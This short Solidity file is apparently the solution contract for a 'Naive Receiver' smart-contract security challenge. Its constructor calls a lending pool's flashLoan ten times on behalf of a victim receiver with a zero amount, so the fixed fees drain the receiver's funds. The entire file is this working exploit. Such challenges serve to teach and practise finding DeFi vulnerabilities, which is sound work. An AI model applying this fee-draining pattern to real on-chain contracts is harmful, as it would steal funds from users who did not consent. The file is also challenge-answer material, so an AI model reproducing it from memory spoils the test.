// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./NaiveReceiverLenderPool.sol";
import "./FlashLoanReceiver.sol";

contract NaiveReceiverSolution{
    constructor(address payable poolAddress, address receiver){
        NaiveReceiverLenderPool pool = NaiveReceiverLenderPool(poolAddress);
        for(uint256 i = 0; i < 10; i++){
            pool.flashLoan(receiver, 0);
        }
    }
}